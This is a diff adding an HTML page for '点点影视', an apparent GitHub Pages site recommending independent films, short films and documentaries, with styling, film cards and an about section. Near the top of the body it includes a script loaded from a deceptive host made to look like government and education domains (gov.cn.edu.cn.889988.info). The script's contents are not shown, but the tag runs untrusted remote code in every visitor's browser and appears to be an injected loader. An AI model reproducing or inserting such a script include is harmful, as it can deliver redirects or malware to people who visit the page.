@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>点点影视 - 微光影视导航与片单推荐 | diandianyingshi-h5.github.io</title>
+<meta name="description" content="点点影视(diandianyingshi-h5.github.io)以夜灯与微光点点为视觉，整理独立电影、小众佳片、短片、纪录片片单，每一束微光都值得被看见。" />
+<meta name="keywords" content="点点影视,diandianyingshi-h5,微光影视,独立电影,小众佳片,短片纪录片" />
+<style>
+:root{
+  --light:#ffd54f;
+  --light-2:#ffb300;
+  --indigo:#1a1a2e;
+  --indigo-2:#16213e;
+  --indigo-3:#0f1428;
+  --dot:#e94560;
+  --paper:#f0f0f5;
+  --paper-2:#e2e2ea;
+  --ink:#2a2a3a;
+  --ink-2:#5a5a6a;
+  --ink-3:#8a8a98;
+  --shadow:0 8px 24px rgba(26,26,46,0.12);
+  --shadow-hover:0 16px 40px rgba(233,69,96,0.2);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(circle at 50% 0%,rgba(255,213,79,0.08),transparent 50%),
+    var(--paper);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--dot);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 光点粒子 */
+.particles{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.particles i{
+  position:absolute;border-radius:50%;background:var(--light);opacity:.4;animation:glow linear infinite;
+}
+.particles i:nth-child(1){top:10%;left:5%;width:4px;height:4px;animation-duration:4s}
+.particles i:nth-child(2){top:20%;left:15%;width:3px;height:3px;animation-duration:5s;animation-delay:1s}
+.particles i:nth-child(3){top:15%;left:80%;width:5px;height:5px;animation-duration:3.5s;animation-delay:0.5s}
+.particles i:nth-child(4){top:40%;left:90%;width:3px;height:3px;animation-duration:4.5s;animation-delay:2s}
+.particles i:nth-child(5){top:60%;left:10%;width:4px;height:4px;animation-duration:5.5s;animation-delay:1.5s}
+.particles i:nth-child(6){top:75%;left:85%;width:3px;height:3px;animation-duration:4s;animation-delay:0.8s}
+.particles i:nth-child(7){top:85%;left:50%;width:4px;height:4px;animation-duration:6s;animation-delay:2.5s}
+@keyframes glow{0%,100%{opacity:.2;transform:scale(1)}50%{opacity:.8;transform:scale(1.3)}}
+
+/* 灯泡头 */
+.lamp-head{
+  position:relative;z-index:10;text-align:center;padding:54px 20px 40px;
+  background:linear-gradient(180deg,var(--paper-2),var(--paper));
+  border-bottom:2px solid var(--light);
+}
+.bulb-logo{
+  width:90px;height:90px;margin:0 auto 16px;position:relative;
+  background:radial-gradient(circle at 50% 40%,var(--light),var(--light-2));
+  border-radius:50% 50% 45% 45% / 55% 55% 45% 45%;
+  display:flex;align-items:center;justify-content:center;font-size:38px;
+  box-shadow:0 0 30px rgba(255,213,79,0.5),0 0 60px rgba(255,213,79,0.2);
+  animation:flicker 4s ease-in-out infinite;
+}
+@keyframes flicker{0%,100%{box-shadow:0 0 30px rgba(255,213,79,0.5),0 0 60px rgba(255,213,79,0.2)}50%{box-shadow:0 0 40px rgba(255,213,79,0.7),0 0 80px rgba(255,213,79,0.3)}}
+.bulb-logo::after{
+  content:"";position:absolute;bottom:-10px;left:50%;transform:translateX(-50%);
+  width:34px;height:14px;background:var(--indigo);border-radius:4px 4px 8px 8px;
+}
+.lamp-head h1{font-size:30px;font-weight:900;letter-spacing:5px;color:var(--indigo-2)}
+.lamp-head h1 b{color:var(--dot)}
+.lamp-head p{max-width:520px;margin:12px auto 0;color:var(--ink-2);font-size:15px}
+.lamp-nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.lamp-nav a{
+  padding:8px 20px;border:1px solid var(--indigo-2);border-radius:20px;
+  font-size:14px;font-weight:600;color:var(--ink);background:rgba(255,255,255,0.7);transition:.25s;
+}
+.lamp-nav a:hover{background:var(--indigo-2);color:var(--paper);border-color:var(--indigo)}
+
+/* 光带 */
+.beam-bar{
+  position:relative;z-index:10;background:var(--indigo-2);color:var(--paper);
+  padding:10px 20px;font-size:13px;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap;
+  border-bottom:1px solid var(--light);
+}
+.beam-bar .spark{display:inline-block;width:6px;height:6px;background:var(--light);border-radius:50%;animation:spark 1.8s ease-in-out infinite}
+@keyframes spark{0%,100%{opacity:.3;transform:scale(1)}50%{opacity:1;transform:scale(1.5)}}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .dot-i{
+  width:32px;height:32px;background:var(--dot);color:#fff;
+  display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;
+  border-radius:50%;flex-shrink:0;box-shadow:0 0 10px rgba(233,69,96,0.3);
+}
+.sec-title h2{font-size:22px;font-weight:800;letter-spacing:2px;color:var(--indigo-2)}
+.sec-title .line{flex:1;height:1px;background:linear-gradient(90deg,var(--dot),transparent)}
+
+/* 光点片单 */
+.spot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:22px}
+.spot-card{
+  position:relative;background:#fff;border:1px solid rgba(26,26,46,0.08);border-radius:14px;
+  padding:22px 20px 24px;box-shadow:var(--shadow);transition:.3s;overflow:hidden;
+}
+.spot-card::before{
+  content:"";position:absolute;top:16px;left:16px;width:8px;height:8px;border-radius:50%;
+  background:var(--light);box-shadow:0 0 8px rgba(255,213,79,0.6);z-index:1;
+}
+.spot-card::after{
+  content:"";position:absolute;bottom:0;left:14px;right:14px;height:2px;
+  background:linear-gradient(90deg,var(--light),var(--dot),var(--light));
+}
+.spot-card:hover{transform:translateY(-5px);box-shadow:var(--shadow-hover);border-color:var(--light)}
+.spot-card .lum-tag{
+  display:inline-block;font-size:11px;color:#fff;background:var(--indigo-2);
+  padding:2px 10px;border-radius:10px;margin-bottom:10px;margin-left:14px;
+}
+.spot-card h3{font-size:17px;font-weight:800;color:var(--ink);margin-bottom:4px;margin-left:14px}
+.spot-card .meta{font-size:12px;color:var(--ink-3);margin-bottom:8px;margin-left:14px}
+.spot-card p{font-size:14px;color:var(--ink-2);line-height:1.75;margin-left:14px}
+.spot-card .glow{
+  position:absolute;right:16px;top:16px;font-size:18px;opacity:.15;
+}
+
+/* 色阶分类 */
+.shade-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.shade{
+  text-align:center;background:#fff;border:1px solid rgba(26,26,46,0.08);border-radius:12px;
+  padding:22px 12px;transition:.25s;cursor:pointer;position:relative;overflow:hidden;
+}
+.shade::before{
+  content:"";position:absolute;top:0;left:0;right:0;height:4px;
+}
+.shade:nth-child(1)::before{background:#ffd54f}
+.shade:nth-child(2)::before{background:#ffb300}
+.shade:nth-child(3)::before{background:#e94560}
+.shade:nth-child(4)::before{background:#16213e}
+.shade:nth-child(5)::before{background:#0f3460}
+.shade:nth-child(6)::before{background:#533483}
+.shade .shade-ico{font-size:28px;margin-bottom:8px}
+.shade h4{font-size:14px;font-weight:800;color:var(--ink)}
+.shade p{font-size:12px;color:var(--ink-3)}
+.shade:hover{background:var(--indigo-2);border-color:var(--indigo)}
+.shade:hover h4,.shade:hover p{color:var(--paper)}
+
+/* 关于 */
+.about-block{
+  background:#fff;border:1px solid rgba(26,26,46,0.08);border-left:4px solid var(--light);
+  border-radius:8px;padding:26px;font-size:15px;color:var(--ink-2);line-height:1.95;
+}
+.about-block b{color:var(--dot)}
+
+/* 微光栏 */
+.glow-bar{
+  position:relative;z-index:10;background:var(--indigo);color:var(--paper);
+  padding:12px 20px;text-align:center;font-size:13px;
+  display:flex;align-items:center;justify-content:center;gap:20px;flex-wrap:wrap;
+}
+.glow-bar .pulse{display:inline-block;width:8px;height:8px;background:var(--light);border-radius:50%;animation:pulse2 2s ease-in-out infinite}
+@keyframes pulse2{0%,100%{opacity:.4;transform:scale(1)}50%{opacity:1;transform:scale(1.4)}}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink-3);font-size:12px;border-top:1px solid rgba(26,26,46,0.1);background:var(--paper-2)}
+
+@media(max-width:640px){
+  .lamp-head h1{font-size:22px;letter-spacing:3px}
+  .bulb-logo{width:70px;height:70px;font-size:30px}
+  .spot-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:18px}
+  .wrap{padding:0 14px 40px}
+  .shade-grid{grid-template-columns:repeat(2,1fr)}
+  .beam-bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="particles" aria-hidden="true">
+  <i></i><i></i><i></i><i></i><i></i><i></i><i></i>
+</div>
+
+<header class="lamp-head">
+  <div class="bulb-logo">💡</div>
+  <h1><b>点点</b>影视</h1>
+  <p>diandianyingshi-h5.github.io —— 每一束微光都值得被看见。独立电影、小众佳片、短片、纪录片，像夜空里的点点星光，安静却明亮。</p>
+  <nav class="lamp-nav">
+    <a href="#">首页</a>
+    <a href="#spot">微光片单</a>
+    <a href="#shade">色阶分类</a>
+    <a href="#about">关于点点</a>
+  </nav>
+</header>
+
+<div class="beam-bar">
+  <span><span class="spark"></span> 灯火不熄 · 微光常亮</span>
+  <span>💡 当前亮度：第 29 档</span>
+  <span>🎬 服务状态：点亮中</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="spot">
+    <div class="sec-title">
+      <span class="dot-i">·</span><h2>微光片单</h2><span class="line"></span>
+    </div>
+    <div class="spot-grid">
+      <article class="spot-card">
+        <span class="lum-tag">独立 · 微光</span>
+        <h3>路边野餐</h3>
+        <div class="meta">2015 · 剧情/文艺 · 毕赣</div>
+        <p>贵州凯里的潮湿空气里，40分钟的长镜头像一场梦游。时间不是线性的，记忆才是唯一的真实。</p>
+        <div class="glow">✨</div>
+      </article>
+      <article class="spot-card">
+        <span class="lum-tag">小众 · 温暖</span>
+        <h3>海街日记</h3>
+        <div class="meta">2015 · 剧情/家庭 · 是枝裕和</div>
+        <p>三姐妹在镰仓的老屋里接纳同父异母的妹妹。樱花、梅子酒、夏日祭，平淡日常里藏着最深的温柔。</p>
+        <div class="glow">🌸</div>
+      </article>
+      <article class="spot-card">
+        <span class="lum-tag">短片 · 灵感</span>
+        <h3>眨眼之间</h3>
+        <div class="meta">2010 · 短片/实验 · 基里科·桑切斯</div>
+        <p>把电影史上的经典眨眼剪辑成一首诗。2分钟的短片，看完你会重新理解"一眨眼"的意义。</p>
+        <div class="glow">👁️</div>
+      </article>
+      <article class="spot-card">
+        <span class="lum-tag">纪录 · 安静</span>
+        <h3>我在故宫修文物</h3>
+        <div class="meta">2016 · 纪录片 · 叶君</div>
+        <p>钟表、书画、陶瓷，修复师们用三年修好一只钟，用一辈子守住一门手艺。安静到让人忘记时间。</p>
+        <div class="glow">🔧</div>
+      </article>
+      <article class="spot-card">
+        <span class="lum-tag">治愈 · 晨光</span>
+        <h3>小萝莉的猴神大叔</h3>
+        <div class="meta">2015 · 剧情/喜剧 · 卡比尔·汗</div>
+        <p>一个印度大叔护送巴基斯坦哑女回家。跨越国界与宗教的善意，像清晨第一缕光，温暖不刺眼。</p>
+        <div class="glow">🌅</div>
+      </article>
+      <article class="spot-card">
+        <span class="lum-tag">暗夜 · 星火</span>
+        <h3>天堂陌客</h3>
+        <div class="meta">1984 · 剧情/独立 · 吉姆·贾木许</div>
+        <p>两个匈牙利移民在美国边境小镇的漫无目的。极简到近乎空白，却让孤独有了形状。</p>
+        <div class="glow">🌑</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="shade">
+    <div class="sec-title">
+      <span class="dot-i">▮</span><h2>色阶分类</h2><span class="line"></span>
+    </div>
+    <div class="shade-grid">
+      <div class="shade"><div class="shade-ico">🎬</div><h4>暖光·电影</h4><p>独立/文艺/外语</p></div>
+      <div class="shade"><div class="shade-ico">📺</div><h4>柔光·剧集</h4><p>小众/英剧/日剧</p></div>
+      <div class="shade"><div class="shade-ico">🌿</div><h4>晨光·动漫</h4><p>治愈/独立动画</p></div>
+      <div class="shade"><div class="shade-ico">🎤</div><h4>侧光·综艺</h4><p>访谈/文化/纪实</p></div>
+      <div class="shade"><div class="shade-ico">📽️</div><h4>逆光·纪录</h4><p>社会/人文/自然</p></div>
+      <div class="shade"><div class="shade-ico">🎭</div><h4>微光·短片</h4><p>实验/微电影/广告</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title">
+      <span class="dot-i">ℹ</span><h2>关于点点</h2><span class="line"></span>
+    </div>
+    <div class="about-block">
+      <p>
+        <b>点点影视</b>（diandianyingshi-h5.github.io）是一个以"夜灯与微光"为气质的独立影视导航与片单整理站点。
+        不追热点爆款，只做<b>值得被点亮的好片子</b>：独立电影、小众佳片、短片、纪录片。
+        每一束微光都不起眼，但聚在一起就是一片星空。页面用灯泡Logo、粒子光点、光点卡片、色阶分类来组织内容，
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流使用。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="glow-bar">
+  <span><span class="pulse"></span> 灯火不熄 · 片单常新</span>
+  <span>💡 已点亮：3700+ 部</span>
+  <span>✨ 服务状态：微光常亮</span>
+</div>
+
+<footer class="footer">
+  © 2026 点点影视 | diandianyingshi-h5.github.io | 每一束微光都值得被看见 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
